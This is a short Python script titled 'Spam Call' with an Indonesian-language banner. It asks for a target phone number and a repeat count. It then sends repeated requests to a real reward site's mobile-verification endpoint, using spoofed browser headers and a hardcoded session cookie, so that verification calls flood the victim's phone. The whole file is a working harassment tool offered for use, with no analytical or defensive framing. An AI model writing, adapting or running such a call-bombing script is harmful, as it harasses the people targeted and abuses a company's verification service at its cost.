import requests,json,os,time

os.system("clear")
banner = """
\tSpam Call
\t=========
•====================•
[+] Pembuat : Gilbert
•====================•
"""
print(banner)
nomor = input("[+] No target : ")
jumlah = int(input("[+] Jumlah : "))
ua = {
"Host":"id.jagreward.com",
"Connection":"keep-alive",
"Accept":"*/*",
"X-Requested-With":"XMLHttpRequest",
"User-Agent":"Mozilla/5.0 (Linux; Android 10; vivo 1935) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.96 Mobile Safari/537.36",
"Sec-Fetch-Site":"same-origin",
"Sec-Fetch-Mode":"cors",
"Referer":"https://id.jagreward.com/member/register/",
"Accept-Encoding":"gzip, deflate, br",
"Accept-Language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
'Cookie':'PHPSESSID=v9l9ct5f3t2ejjnulq9hojjhtj; _ga=GA1.3.590481171.1609752391; DAPROPS="sjs.webGlRenderer:Adreno (TM) 610|bjs.accessDom:1|bcookieSupport:1|bcss.animations:1|bcss.columns:1|bcss.transforms:1|bcss.transitions:1|sdevicePixelRatio:3|idisplayColorDepth:24|bflashCapable:0|bhtml.audio:1|bhtml.canvas:1|bhtml.inlinesvg:1|bhtml.svg:1|bhtml.video:1|bjs.applicationCache:1|bjs.deviceMotion:1|bjs.deviceOrientation:0|bjs.geoLocation:1|bjs.indexedDB:1|bjs.json:1|bjs.localStorage:1|bjs.modifyCss:1|bjs.modifyDom:1|bjs.querySelector:1|bjs.sessionStorage:1|bjs.supportBasicJavaScript:1|bjs.supportConsoleLog:1|bjs.supportEventListener:1|bjs.supportEvents:1|bjs.touchEvents:1|bjs.webGl:1|bjs.webSockets:1|bjs.webSqlDatabase:1|bjs.webWorkers:1|bjs.xhr:1|iorientation:0|buserMedia:1|bjs.battery:0"; _gid=GA1.3.1719417430.1610159711'
}
url = f"https://id.jagreward.com/member/verify-mobile/{nomor}/"
for i in range(int(jumlah)):
  req = requests.get(url,headers=ua).text
  ibet = json.loads(req)
  gg = ibet["result"]
  pp = ibet["message"]
  print(f"Result: {gg}, Message: {pp}")
  time.sleep(5)
